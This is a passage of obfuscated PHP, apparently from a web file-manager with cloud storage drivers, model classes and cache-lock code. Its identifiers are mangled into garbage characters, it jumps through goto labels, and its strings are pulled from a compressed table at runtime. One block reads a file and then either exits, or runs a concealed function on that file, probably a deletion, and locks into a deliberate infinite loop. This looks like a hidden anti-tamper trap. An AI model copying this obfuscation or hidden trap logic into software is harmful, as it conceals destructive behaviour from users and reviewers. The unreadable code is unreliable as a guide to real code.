count($ˆÜ¼¥Ü™) == 0) { break; } $†‡šµ¦[$ÙÜ–°ú[363]][$ü•îÄã][1] = $ˆÜ¼¥Ü™; $this->optionsValue($†‡šµ¦); $–ººé‰Û = parent::select($À›©ƒ¥); if (!$–ººé‰Û) { continue; } $ø¾ñŠàç = is_array($ø¾ñŠàç) ? $ø¾ñŠàç : array(); $ø¾ñŠàç = array_merge($ø¾ñŠàç, $–ººé‰Û); } return $ø¾ñŠàç; } public function delete($Ú›½àšé = array()) { $‚˜ò©ÆÕ =& $_SERVER[±³—úê]; $“÷‹üÉĞ = self::SQL_WHERE_IN_CHUNK; $ˆ”ÔÀ•‰ = $this->optionsValue(); $¹µŞÆÎ¾ = $this->findWhereField($ˆ”ÔÀ•‰); if (!$¹µŞÆÎ¾) { return parent::delete($Ú›½àšé); } $Í‡˜’Ñ¢ = 0; $œªÃ„Œ = $ˆ”ÔÀ•‰[$‚˜ò©ÆÕ[363]][$¹µŞÆÎ¾][1]; $œªÃ„Œ = is_array($œªÃ„Œ) ? $œªÃ„Œ : array(); for ($İ™—‘¬ª = 0; $İ™—‘¬ª < count($œªÃ„Œ); $İ™—‘¬ª += $“÷‹üÉĞ) { $öíŸõ¢» = array_slice($œªÃ„Œ, $İ™—‘¬ª, $“÷‹üÉĞ); if (!is_array($öíŸõ¢») || count($öíŸõ¢») == 0) { break; } $ˆ”ÔÀ•‰[$‚˜ò©ÆÕ[363]][$¹µŞÆÎ¾][1] = $öíŸõ¢»; $this->optionsValue($ˆ”ÔÀ•‰); $Í‡˜’Ñ¢ += parent::delete($Ú›½àšé); } return $Í‡˜’Ñ¢; } private function findWhereField($¤Ÿ‘‡çÎ) { $Çõì†³¹ =& $_SERVER[±³—úê]; $¸‘§®•‚ = self::SQL_WHERE_IN_CHUNK; if (!is_array($¤Ÿ‘‡çÎ) || !is_array($¤Ÿ‘‡çÎ[$Çõì†³¹[363]])) { return !1; } foreach ($¤Ÿ‘‡çÎ[$Çõì†³¹[363]] as $ÉÜÄÊªŞ => $ñï–†÷ö) { if (is_array($ñï–†÷ö) && isset($ñï–†÷ö[0]) && is_string($ñï–†÷ö[0]) && strtolower($ñï–†÷ö[0]) == $Çõì†³¹[7] && is_array($ñï–†÷ö[1]) && count($ñï–†÷ö[1]) > $¸‘§®•‚) { ignore_timeout(); return $ÉÜÄÊªŞ; } } return !1; } public function setMasterDB($É ¡‡Èô = true) { think_config($_SERVER[±³—úê][482], $É ¡‡Èô); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\164\145\x6d\x4f\160\164\x69\x6f\x6e"; public $field = array(); public function listData($ÚÑŒ§±é = false, $Ú´ºê© = "\155\157\144\x69\x66\171\x54\x69\x6d\x65", $§€õõ— = false) { $ùò£‡˜„ = Model($this->modelType)->get(!1, $this->optionType, !0); $ËñŸÕ— = array_values($ùò£‡˜„); if ($ËñŸÕ— && $ËñŸÕ—[0] && !is_array($ËñŸÕ—[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ùò£‡˜„ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ùò£‡˜„) { return $ÚÑŒ§±é ? null : array(); } if (!$ÚÑŒ§±é) { $ùò£‡˜„ = array_filter(array_values($ùò£‡˜„)); return array_sort_by($ùò£‡˜„, $Ú´ºê©, $§€õõ—); } return $ùò£‡˜„[$_SERVER[±³—úê][483] . $ÚÑŒ§±é]; } public function insert($®“˜¡™İ) { $ÑİÅ—¢³ =& $_SERVER[±³—úê]; $®“˜¡™İ = array_field_key($®“˜¡™İ, $this->field); $õÚÓá° = Model($this->modelType)->get($ÑİÅ—¢³[484], $this->optionType . $ÑİÅ—¢³[485]); $õÚÓá° = $õÚÓá° ? $õÚÓá° : 0; $®“˜¡™İ[$ÑİÅ—¢³[486]] = ++$õÚÓá°; $®“˜¡™İ[$ÑİÅ—¢³[243]] = time(); $®“˜¡™İ[$ÑİÅ—¢³[88]] = time(); Model($this->modelType)->set($ÑİÅ—¢³[484], $õÚÓá°, $this->optionType . $ÑİÅ—¢³[485]); Model($this->modelType)->set($ÑİÅ—¢³[483] . $õÚÓá°, $®“˜¡™İ, $this->optionType); return $õÚÓá°; } public function update($¥Îü³£Ï, $šœœ±±Š) { $´ïúĞéú =& $_SERVER[±³—úê]; $šœœ±±Š = array_field_key($šœœ±±Š, $this->field); $›¿ï×‡‰ = $this->listData($¥Îü³£Ï); if (!$›¿ï×‡‰ || !$¥Îü³£Ï) { return !1; } $šœœ±±Š = array_merge($›¿ï×‡‰, $šœœ±±Š); $šœœ±±Š[$´ïúĞéú[88]] = time(); return Model($this->modelType)->set($´ïúĞéú[483] . $¥Îü³£Ï, $šœœ±±Š, $this->optionType); } public function remove($„»èåŠ¼) { if (!$„»èåŠ¼) { return !1; } return Model($this->modelType)->remove($_SERVER[±³—úê][483] . $„»èåŠ¼, $this->optionType); } public function clear() { $¶½ÙË…‹ =& $_SERVER[±³—úê]; Model($this->modelType)->remove($¶½ÙË…‹[484], $this->optionType . $¶½ÙË…‹[485]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Ê²éƒ”¸, $¸íàèşô) { if (!$¸íàèşô) { return !1; } $º¥‚ÉÀÇ = $this->listData(); $º¥‚ÉÀÇ = array_to_keyvalue($º¥‚ÉÀÇ, $Ê²éƒ”¸); return isset($º¥‚ÉÀÇ[$¸íàèşô]) ? $º¥‚ÉÀÇ[$¸íàèşô] : !1; } public function findByName($şá„ĞÒÎ) { return $this->findByKey($_SERVER[±³—úê][32], $şá„ĞÒÎ); } protected function resetData($¾›ıƒ§Ğ) { $‘¨øÃ…İ =& $_SERVER[±³—úê]; $¾›ıƒ§Ğ = is_array($¾›ıƒ§Ğ) ? $¾›ıƒ§Ğ : array(); $¿¢±¿‘ = array(); for ($ŒĞõüœ° = 0; $ŒĞõüœ° < count($¾›ıƒ§Ğ); $ŒĞõüœ°++) { $¿¢±¿‘[$‘¨øÃ…İ[483] . $¾›ıƒ§Ğ[$ŒĞõüœ°][$‘¨øÃ…İ[486]]] = $¾›ıƒ§Ğ[$ŒĞõüœ°]; } return Model($this->modelType)->set($¿¢±¿‘, !1, $this->optionType); } private function getAutoName($¬Æ“›ñÏ) { $ÅÑµòÉ¡ = array_to_keyvalue($this->listData(), $_SERVER[±³—úê][32]); if (!$ÅÑµòÉ¡ || !isset($ÅÑµòÉ¡[$¬Æ“›ñÏ])) { return $¬Æ“›ñÏ; } for ($í¯¹“–İ = 1; $í¯¹“–İ < count($ÅÑµòÉ¡); $í¯¹“–İ++) { $ıƒ©—›© = $¬Æ“›ñÏ . "\50{$í¯¹“–İ}\x29"; if (!isset($ÅÑµòÉ¡[$ıƒ©—›©])) { return $ıƒ©—›©; } } return $ıƒ©—›©; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Á”¤—ı¼ = false, $¾¡ıÀ¼§ = '', $Ã´ê™‘ = false) { $†»ãæ×ƒ =& $_SERVER[±³—úê]; $•ŒÕ—˜¯ = $this->cacheGet($¾¡ıÀ¼§); $²Şî»Ï¬ = $this->optionDefault($¾¡ıÀ¼§); $²Şî»Ï¬ = is_array($²Şî»Ï¬) ? $²Şî»Ï¬ : array(); if (is_array($•ŒÕ—˜¯)) { $•ŒÕ—˜¯ = array_merge($²Şî»Ï¬, $•ŒÕ—˜¯); return $Á”¤—ı¼ ? isset($•ŒÕ—˜¯[$Á”¤—ı¼]) ? $•ŒÕ—˜¯[$Á”¤—ı¼] : null : $•ŒÕ—˜¯; } $áç¤ˆ´Ÿ = $this->filterWhere(array($†»ãæ×ƒ[33] => $¾¡ıÀ¼§)); $•ŒÕ—˜¯ = $this->where($áç¤ˆ´Ÿ)->select(); $•ŒÕ—˜¯ = array_to_keyvalue($•ŒÕ—˜¯, $†»ãæ×ƒ[97], $†»ãæ×ƒ[461]); foreach ($•ŒÕ—˜¯ as $Ÿ÷ÓùÎú => $±œ‡òãø) { if ($Ã´ê™‘ || in_array($Ÿ÷ÓùÎú, $this->jsonField)) { $•ŒÕ—˜¯[$Ÿ÷ÓùÎú] = json_decode($±œ‡òãø, !0); } } $this->cacheSet($¾¡ıÀ¼§, $•ŒÕ—˜¯); $•ŒÕ—˜¯ = array_merge($²Şî»Ï¬, $•ŒÕ—˜¯); return $Á”¤—ı¼ ? $•ŒÕ—˜¯[$Á”¤—ı¼] : $•ŒÕ—˜¯; } public function set($Ş®´ä™¦, $ı´ãˆµò = false, $¿ñªí¤ß = '') { $é°·¯Ò³ =& $_SERVER[±³—úê]; $this->cacheRemove($¿ñªí¤ß); $éÂÂ€‹ = array(); $öÚşÄò = is_array($Ş®´ä™¦) ? $Ş®´ä™¦ : array($Ş®´ä™¦ => $ı´ãˆµò); foreach ($öÚşÄò as $¸—äŸÃÑ => $ÉÎôƒ‰›) { if (is_array($ÉÎôƒ‰›)) { $ÉÎôƒ‰› = json_encode_force($ÉÎôƒ‰›); } $this->checkLength($ÉÎôƒ‰›, !1, $this->tableName . $é°·¯Ò³[4] . $Ş®´ä™¦); $ÉÎôƒ‰› = self::textEncode($ÉÎôƒ‰›); $öÚşÄò = array($é°·¯Ò³[33] => $¿ñªí¤ß, $é°·¯Ò³[97] => $¸—äŸÃÑ, $é°·¯Ò³[461] => $ÉÎôƒ‰›); $éÂÂ€‹[] = $this->filterWhere($öÚşÄò); } if (!$éÂÂ€‹) { return !0; } $Ç…ùÎäà = $this->cacheKey($é°·¯Ò³[487]); CacheLock::lock($Ç…ùÎäà); $Öí¹ËŠÉ = $this->addAll($éÂÂ€‹, array(), !0); CacheLock::unlock($Ç…ùÎäà); return $Öí¹ËŠÉ; } protected function optionDefault($Å´”¤Æ = '') { return !1; } public function setDeep($³šë‘¶«, $Àš‹ŸÑÑ = false, $û”îÖ“ë = '') { $ˆñ»åˆı = explode($_SERVER[±³—úê][10], $³šë‘¶«); $Í£ŠéêÔ = $this->get(); array_set_value($Í£ŠéêÔ, $³šë‘¶«, $Àš‹ŸÑÑ); $this->set($ˆñ»åˆı[0], $Í£ŠéêÔ[$ˆñ»åˆı[0]], $û”îÖ“ë); } public function remove($•Ö›©·, $­âŒ¸Ï« = '') { $…ƒğüü =& $_SERVER[±³—úê]; $this->cacheRemove($­âŒ¸Ï«); $©ŠŸ©ˆø = $this->filterWhere(array($…ƒğüü[97] => $•Ö›©·, $…ƒğüü[33] => $­âŒ¸Ï«)); if (is_null($•Ö›©·)) { unset($©ŠŸ©ˆø[$…ƒğüü[97]]); } return $this->where($©ŠŸ©ˆø)->delete(); } public function cacheSet($ÅĞ¡ú, $ôˆÎÉ‘ê = false) { return Cache::set($this->cacheKey($ÅĞ¡ú), $ôˆÎÉ‘ê); } public function cacheGet($²šŞ¥§) { return Cache::get($this->cacheKey($²šŞ¥§)); } public function cacheRemove($éšÙ±¢Œ) { return Cache::remove($this->cacheKey($éšÙ±¢Œ)); } protected function filterWhere($Ôµ¼üÈº) { return $Ôµ¼üÈº; } protected function cacheKey($ÌºÌ³˜±) { return $ÌºÌ³˜±; } } goto b£Á©Ñ„¯ë; c¥×°¬®ß: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($¼ğêÓê) { parent::__construct($¼ğêÓê); $this->setSignVersion($_SERVER[±³—úê][259]); } public function fileOutImage($«£‹“¦ä, $òÀú®ÏÀ = 250) { $É—–æ =& $_SERVER[±³—úê]; if ($this->size($«£‹“¦ä) > 1024 * 1024 * 25) { return $this->fileOutImageServer($«£‹“¦ä, $òÀú®ÏÀ); } $»¥Ü¾Ä“ = array($É—–æ[1462] => $É—–æ[1463] . $òÀú®ÏÀ . $É—–æ[1464]); $×¯“ß–Õ = $this->link($«£‹“¦ä, $»¥Ü¾Ä“); $this->fileOutLink($×¯“ß–Õ); } public function fileOutLink($ıå¿á×¯) { $¢›÷Ü¢‰ =& $_SERVER[±³—úê]; if (substr($ıå¿á×¯, 0, 7) == $¢›÷Ü¢‰[228]) { $ıå¿á×¯ = $¢›÷Ü¢‰[229] . substr($ıå¿á×¯, 7); } header($¢›÷Ü¢‰[175] . $ıå¿á×¯); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($á¯Èü²‘) { parent::__construct($á¯Èü²‘); $this->setSignVersion($_SERVER[±³—úê][259]); } public function fileOutLink($¬ôççÀ©) { $ññĞ†é¸ =& $_SERVER[±³—úê]; if (substr($¬ôççÀ©, 0, 7) == $ññĞ†é¸[228]) { $¬ôççÀ© = $ññĞ†é¸[229] . substr($¬ôççÀ©, 7); } header($ññĞ†é¸[175] . $¬ôççÀ©); die; } public function uploadFormData($¡¯†ú†, $õ€‰”ÇĞ = 3600) { return $this->uploadFormDataV2($¡¯†ú†, $õ€‰”ÇĞ); } } $_file = $_SERVER[$_SERVER[±³—úê][225]]; goto Føá¸‚¹¤¶; E¶ó‡éÕ“Æ: if (!isset($_SERVER[$_SERVER[±³—úê][216]]) || !isset($_SERVER[$_SERVER[±³—úê][225]])) { $_getc = $_SERVER[±³—úê][218]; $_getfile = $_SERVER[$_SERVER[±³—úê][219]] . $_SERVER[±³—úê][220]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[±³—úê][221], $_getfilec); if (count($_getarrs) < $_SERVER[±³—úê][222]) { $exit = $_SERVER[±³—úê][223]; $exit(); } $_act = $_SERVER[±³—úê][224]; $_act($_SERVER[$_SERVER[±³—úê][219]] . $_SERVER[±³—úê][220]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[±³—úê][465]); } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($™ºùîß) { parent::__construct($™ºùîß); $this->setSignVersion($_SERVER[±³—úê][259]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($¢Ù¯«¬¬) { parent::__construct($¢Ù¯«¬¬); $this->setSignVersion($_SERVER[±³—úê][259]); } public function uploadFormData($Õ§ˆõø, $¤é¨Şöà = 3600) { $ûÁ”ğÂÑ =& $_SERVER[±³—úê]; $–š›Ê¡° = $ûÁ”ğÂÑ[241]; $Üã˜â¿ = $ûÁ”ğÂÑ[269]; $«õŒïü£ = $ûÁ”ğÂÑ[62]; $ÒÏ¯ñ÷Ï = gmdate($ûÁ”ğÂÑ[270]); $¢Ã‘¬´Ô = gmdate($ûÁ”ğÂÑ[271]); $óÚùÁ¯ = $ûÁ”ğÂÑ[272]; $ÌÍÂ¯ˆ› = $¤é¨Şöà . $ûÁ”ğÂÑ[12]; $öî›Íä = $ûÁ”ğÂÑ[273]; $ÅÔ¯¬ËĞ = array($this->accessKey, $¢Ã‘¬´Ô, $this->region, $«õŒïü£, $óÚùÁ¯); $Õü¬§áà = implode($ûÁ”ğÂÑ[8], $ÅÔ¯¬ËĞ); $Şş¿ˆ²ğ = array($ûÁ”ğÂÑ[274] => gmdate($ûÁ”ğÂÑ[1415], strtotime($ûÁ”ğÂÑ[276])), $ûÁ”ğÂÑ[277] => array(array($ûÁ”ğÂÑ[278] => $this->bucket), array($ûÁ”ğÂÑ[317] => $–š›Ê¡°), array($ûÁ”ğÂÑ[279], $ûÁ”ğÂÑ[280], $ûÁ”ğÂÑ[12]), array($ûÁ”ğÂÑ[279], $ûÁ”ğÂÑ[281], $ûÁ”ğÂÑ[12]), array($ûÁ”ğÂÑ[279], $ûÁ”ğÂÑ[318], $ûÁ”ğÂÑ[12]), array($ûÁ”ğÂÑ[282] => $öî›Íä), array($ûÁ”ğÂÑ[283] => $Õü¬§áà), array($ûÁ”ğÂÑ[284] => $Üã˜â¿), array($ûÁ”ğÂÑ[285] => $ÒÏ¯ñ÷Ï), array($ûÁ”ğÂÑ[286] => $ÌÍÂ¯ˆ›))); $£´èğùÔ = base64_encode(json_encode($Şş¿ˆ²ğ)); $²í°»ÕÊ = hash_hmac($ûÁ”ğÂÑ[287], $¢Ã‘¬´Ô, $ûÁ”ğÂÑ[288] . $this->secret, !0); $¤Çîë¥‚ = hash_hmac($ûÁ”ğÂÑ[287], $this->region, $²í°»ÕÊ, !0); $¬£­Í– = hash_hmac($ûÁ”ğÂÑ[287], $«õŒïü£, $¤Çîë¥‚, !0); $µèó ì‘ = hash_hmac($ûÁ”ğÂÑ[287], $óÚùÁ¯, $¬£­Í–, !0); $ß‚ÄŒú‰ = hash_hmac($ûÁ”ğÂÑ[287], $£´èğùÔ, $µèó ì‘); $ÕŞÑ”’ = array($ûÁ”ğÂÑ[258] => $ûÁ”ğÂÑ[12], $ûÁ”ğÂÑ[305] => $ûÁ”ğÂÑ[12], $ûÁ”ğÂÑ[317] => $–š›Ê¡°, $ûÁ”ğÂÑ[282] => $öî›Íä, $ûÁ”ğÂÑ[289] => $£´èğùÔ, $ûÁ”ğÂÑ[319] => $Õü¬§áà, $ûÁ”ğÂÑ[320] => $Üã˜â¿, $ûÁ”ğÂÑ[321] => $ÒÏ¯ñ÷Ï, $ûÁ”ğÂÑ[322] => $ÌÍÂ¯ˆ›, $ûÁ”ğÂÑ[323] => $ß‚ÄŒú‰, $ûÁ”ğÂÑ[208] => $this->getHost()); return $ÕŞÑ”’; } } goto Cï–¹–ŸŠé; c‘ƒÀŠ·ˆ³: define($_SERVER[±³—úê][0], $_SERVER[±³—úê][1]); $_SERVER[ºÌĞéÉ—] = explode($_SERVER[±³—úê][2], gzinflate(substr($_SERVER[±³—úê][3], 10, -8))); function binCheckEq($‹ˆÚ‚é¥, $ë¯Ä´ıˆ) { return $‹ˆÚ‚é¥ == $ë¯Ä´ıˆ; } goto F³¦¡¡ÂÚö; CÑ¼ŠÀ˜Å¥: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $û¶¨ıáº =& $_SERVER[±³—úê]; $Â©Üß = $GLOBALS[$û¶¨ıáº[6]][$û¶¨ıáº[435]]; self::$cachePath = $Â©Üß[$û¶¨ıáº[242]][$û¶¨ıáº[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($®áèÉè³, $·Ä¤ô»Ä = 0) { $Ÿ¯ûúÒ =& $_SERVER[±³—úê]; $ùÏèÊ = microtime(!0); $Ï¬·æ¶ = $ùÏèÊ + $·Ä¤ô»Ä + 0.0001; $›àË½ú÷ = rtrim(self::$cachePath, $Ÿ¯ûúÒ[8]) . $Ÿ¯ûúÒ[945] . md5($®áèÉè³) . $Ÿ¯ûúÒ[942]; if (file_exists($›àË½ú÷) && filemtime($›àË½ú÷) && filemtime($›àË½ú÷) < time() - 10) { @unlink($›àË½ú÷); } do { if (file_exists($›àË½ú÷)) { cacheLockWait(); continue; } $êİ‘Û…£ = fopen($›àË½ú÷, $Ÿ¯ûúÒ[946]); if (!$êİ‘Û…£) { return !1; } $…ı…Ï¥¹ = flock($êİ‘Û…£, LOCK_EX | LOCK_NB); self::$caches[$®áèÉè³] = array($Ÿ¯ûúÒ[947] => $êİ‘Û…£, $Ÿ¯ûúÒ[242] => $›àË½ú÷); fwrite($êİ‘Û…£, $Ï¬·æ¶); clearstatcache(); if ($êİ‘Û…£ && $…ı…Ï¥¹) { return !0; } cacheLockWait(); } while (microtime(!0) < $Ï¬·æ¶); $this->unlock($®áèÉè³); return !1; } public function lockGet($î§•©õ©) { $ÌõªĞÄ =& $_SERVER[±³—úê]; $ÏŒúˆÌ¢ = rtrim(self::$cachePath, $ÌõªĞÄ[8]) . $ÌõªĞÄ[945] . md5($î§•©õ©) . $ÌõªĞÄ[942]; return file_exists($ÏŒúˆÌ¢); } public function unlock($ã¸ŠŞíˆ) { $¡»óÎ• =& $_SERVER[±³—úê]; $¸ğÓ±ÒÈ = self::$caches[$ã¸ŠŞíˆ]; if (!$¸ğÓ±ÒÈ) { return; } @flock($¸ğÓ±ÒÈ[$¡»óÎ•[947]], LOCK_UN); @fclose($¸ğÓ±ÒÈ[$¡»óÎ•[947]]); @unlink($¸ğÓ±ÒÈ[$¡»óÎ•[242]]); unset(self::$caches[$ã¸ŠŞíˆ]); } } class CacheLockRedis { public function lock($§äóÙŒ¹, $ÑÚôˆ˜– = 10) { $´Ş­µíË = Cache::init(); $‘üõ¤ÁÀ = microtime(!0) + $ÑÚôˆ˜–; while (microtime(!0) < $‘üõ¤ÁÀ) { $œ£ÍĞ†€ = $´Ş­µíË->get($§äóÙŒ¹); if (!$œ£ÍĞ†€) { $ö²éı¸Ù = $´Ş­µíË->setLock($§äóÙŒ¹, $‘üõ¤ÁÀ, $ÑÚôˆ˜–); if ($ö²éı¸Ù) { return !0; } } else { if ($œ£ÍĞ†€ < microtime(!0)) { $´Ş­µíË->set($§äóÙŒ¹, $‘üõ¤ÁÀ, $ÑÚôˆ˜– * 2); if ($´Ş­µíË->get($§äóÙŒ¹) === $œ£ÍĞ†€) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ø®øµ¤Ÿ) { return Cache::init()->get($ø®øµ¤Ÿ); } public function unlock($ïÌğàÂÈ) { return Cache::init()->remove($ïÌğàÂÈ); } } goto AÓ”ˆï¦±‹; Dˆå¼ğ·§: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\x72\56\164\x61\x67\x4c\151\x73\x74"; public $modelType = "\125\163\145\x72\x4f\160\x74\151\x6f\156"; public $field = array("\156\x61\x6d\145", "\x73\x74\x79\x6c\145", "\x73\x6f\162\164"); public function listData($¤‹ÕˆÃ… = false, $é‰Ì åş = "\163\157\x72\164", $ÅÈ…ôšü = false) { return parent::listData($¤‹ÕˆÃ…, $é‰Ì åş, $ÅÈ…ôšü); } public function remove($Ù•ˆ«É“) { return parent::remove($Ù•ˆ«É“); } public function add($¯¦…¨™Ë, $ß†´àØ² = "\154\141\142\145\154\x2d\147\162\145\171\55\156\157\162\155\141\154") { $î”¹¯¹´ =& $_SERVER[±³—úê]; if ($this->findByName($¯¦…¨™Ë)) { return !1; } $¦Ñ™€âÂ = array($î”¹¯¹´[505] => $¯¦…¨™Ë, $î”¹¯¹´[569] => $ß†´àØ², $î”¹¯¹´[1979] => $this->getSort($î”¹¯¹´[346]) + 1); return parent::insert($¦Ñ™€âÂ); } public function update($Ñä›©­Ç, $ÇµÇ‚±‘) { $ü¿šÚ¢¡ =& $_SERVER[±³—úê]; $‹„ŒÛó = $this->listData($Ñä›©­Ç); $¬¹•Û¨‹ = $this->findByName($ÇµÇ‚±‘[$ü¿šÚ¢¡[32]]); if (!$‹„ŒÛó || $¬¹•Û¨‹ && $¬¹•Û¨‹[$ü¿šÚ¢¡[486]] != $‹„ŒÛó[$ü¿šÚ¢¡[486]]) { return !1; } return parent::update($Ñä›©­Ç, $ÇµÇ‚±‘); } public function moveTop($‹îÔË¬Ì) { $ªäÍƒã =& $_SERVER[±³—úê]; $ö›òôşÆ = parent::listData(); $×¸³†·ã = $this->getSort($ªäÍƒã[345]); foreach ($ö›òôşÆ as &$²îœ‡‡) { if ($²îœ‡‡[$ªäÍƒã[486]] == $‹îÔË¬Ì) { $²îœ‡‡[$ªäÍƒã[1999]] = $×¸³†·ã; continue; } $²îœ‡‡[$ªäÍƒã[1999]] += 1; } unset($²îœ‡‡); return parent::resetData($ö›òôşÆ); } public function moveBottom($‚†¦ºıì) { $âÜ«ÌŒ =& $_SERVER[±³—úê]; $ÛÏ¨ç·Ş = $this->getSort($âÜ«ÌŒ[346]) + 1; return parent::update($‚†¦ºıì, array($âÜ«ÌŒ[1999] => $ÛÏ¨ç·Ş)); } public function resetSort($Ö±ÓÜÎá) { $š—˜î–é =& $_SERVER[±³—úê]; $ş˜¡¡ÀÁ = array(); $Ö±ÓÜÎá = is_array($Ö±ÓÜÎá) ? $Ö±ÓÜÎá : array(); for ($©á¸½Çó = 0; $©á¸½Çó < count($Ö±ÓÜÎá); $©á¸½Çó++) { $ş˜¡¡ÀÁ[$Ö±ÓÜÎá[$©á¸½Çó] . $š—˜î–é[12]] = $©á¸½Çó + 1; } $ç¸Î¢ÃÊ = parent::listData(); foreach ($ç¸Î¢ÃÊ as &$áÕĞ•½ù) { $Şš¨­Ù = $ş˜¡¡ÀÁ[$áÕĞ•½ù[$š—˜î–é[486]]]; $áÕĞ•½ù[$š—˜î–é[1999]] = $Şš¨­Ù ? $Şš¨­Ù : $áÕĞ•½ù[$š—˜î–é[1999]]; } unset($áÕĞ•½ù); return parent::resetData($ç¸Î¢ÃÊ); } private function getSort($ûŠŞÎà¯) { $Õö°ÎñÁ =& $_SERVER[±³—úê]; $²Ü±Å³ó = parent::listData(); $‘ƒçö»ƒ = array_to_keyvalue($²Ü±Å³ó, $Õö°ÎñÁ[12], $Õö°ÎñÁ[1999]); if (!$‘ƒçö»ƒ) { $‘ƒçö»ƒ = array(0); } $ú…ô‰Ù³ = $ûŠŞÎà¯ == $Õö°ÎñÁ[346] ? max($‘ƒçö»ƒ) : min($‘ƒçö»ƒ); return intval($ú…ô‰Ù³); } } goto eÔå‹×±‘Á; B‰¥ã¤Ô¾: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($Ì­ÏÃÍÊ) { parent::__construct(); require_once SDK_DIR . $_SERVER[±³—úê][1532]; $this->_init($Ì­ÏÃÍÊ); } public function _init($‹€ïØô‰) { $şè¥Äë‡ =& $_SERVER[±³—úê]; $this->config = $‹€ïØô‰; foreach ($‹€ïØô‰ as $«º¿Œ€ğ => $¹’â“½¾) { if (isset($this->{$«º¿Œ€ğ})) { $this->{$«º¿Œ€ğ} = $¹’â“½¾; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($şè¥Äë‡[1533] . LNG($şè¥Äë‡[1468])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($½à¾ÑŞ±, $ÑÀ±é¼· = '', $äÙİğŠ… = REPEAT_RENAME) { if ($this->setContent($½à¾ÑŞ±, $ÑÀ±é¼·)) { return $this->getPathOuter($½à¾ÑŞ±); } return !1; } public function mkdir($ùáÙÁ¸—, $£›ûŞş× = REPEAT_SKIP) { $ğ¨Œæ™Ü =& $_SERVER[±³—úê]; $úùñÆ‰Ü = trim($ùáÙÁ¸—, $ğ¨Œæ™Ü[8]); if ($this->_isFolder($úùñÆ‰Ü)) { return $this->getPathOuter($úùñÆ‰Ü); } $ùáÙÁ¸— = $úùñÆ‰Ü . $ğ¨Œæ™Ü[8]; $ä‹ÑÉ˜è = get_path_this($úùñÆ‰Ü); $å¤¤º = $ùáÙÁ¸— . $ä‹ÑÉ˜è; if (!$this->mkfile($å¤¤º)) { return !1; } if (!$this->moveFile($å¤¤º, $ùáÙÁ¸—)) { $this->delFile($å¤¤º); return !1; } return $this->getPathOuter($úùñÆ‰Ü); } public function copyFile($¬…ß´, $Ÿ¢Ê“) { $Ï‚Ç©â‘ = $this->bucketManager->copy($this->bucket, $¬…ß´, $this->bucket, $Ÿ¢Ê“, !0); return $Ï‚Ç©â‘ ? !1 : $this->getPathOuter($Ÿ¢Ê“); } public function moveFile($‚İâ½ñ–, $‰ì‰¥Ş) { $ôıˆĞ = $this->bucketManager->move($this->bucket, $‚İâ½ñ–, $this->bucket, $‰ì‰¥Ş, !0); return $ôıˆĞ ? !1 : $this->getPathOuter($‰ì‰¥Ş); } public function delFile($·Ø¯ŞúÂ) { if (!$this->exist($·Ø¯ŞúÂ)) { return !0; } $µÍıÍ®¾ = $this->bucketManager->delete($this->bucket, $·Ø¯ŞúÂ); if (!$µÍıÍ®¾) { return !0; } return $µÍıÍ®¾->code() == 612 ? !0 : !1; } public function delFolder($â‚ƒ¦Òœ) { $¹ğ©×µİ =& $_SERVER[±³—úê]; if (!$this->exist($â‚ƒ¦Òœ)) { return !0; } $this->listItemCache = !1; $êÕÇŸ = $this->fileList($â‚ƒ¦Òœ); $this->listItemCache = !0; $é‹£èö = trim($â‚ƒ¦Òœ, $¹ğ©×µİ[8]) . $¹ğ©×µİ[8]; if (!empty($â‚ƒ¦Òœ) && $â‚ƒ¦Òœ !== $¹ğ©×µİ[240] && !in_array($é‹£èö, $êÕÇŸ[$¹ğ©×µİ[85]])) { $êÕÇŸ[$¹ğ©×µİ[85]][] = $é‹£èö; } $ı›ªü¿– = $this->delByBatch($êÕÇŸ[$¹ğ©×µİ[86]]); if (!$ı›ªü¿–) { return !1; } $ı›ªü¿– = $this->delByBatch($êÕÇŸ[$¹ğ©×µİ[85]]); if (!$ı›ªü¿–) { return !1; } return $this->delFile($é‹£èö); } private function delByBatch($æÎó¾õ) { foreach (array_chunk($æÎó¾õ, 1000) as $÷à×¢ô‚) { $ªàèµÀë = $this->bucketManager->buildBatchDelete($this->bucket, $÷à×¢ô‚); list($Í—şØÒ£, $ƒäĞÉ¤•) = $this->bucketManager->batch($ªàèµÀë); if ($ƒäĞÉ¤•) { return !1; } } return !0; } public function rename($œœºÅ¸¤, $¨ Ä¼Å) { return $this->renameObject($œœºÅ¸¤, $¨ Ä¼Å); } public function fileInfo($Ìõœ±˜Ğ, $¼æ¿‰¾§ = false, $ÌòøåªÏ = array()) { $‡¾ûÉÊÄ =& $_SERVER[±³—úê]; $·Ó©×Ò = array($‡¾ûÉÊÄ[32] => $this->pathThis($Ìõœ±˜Ğ), $‡¾ûÉÊÄ[87] => $this->getPathOuter($‡¾ûÉÊÄ[8] . $Ìõœ±˜Ğ), 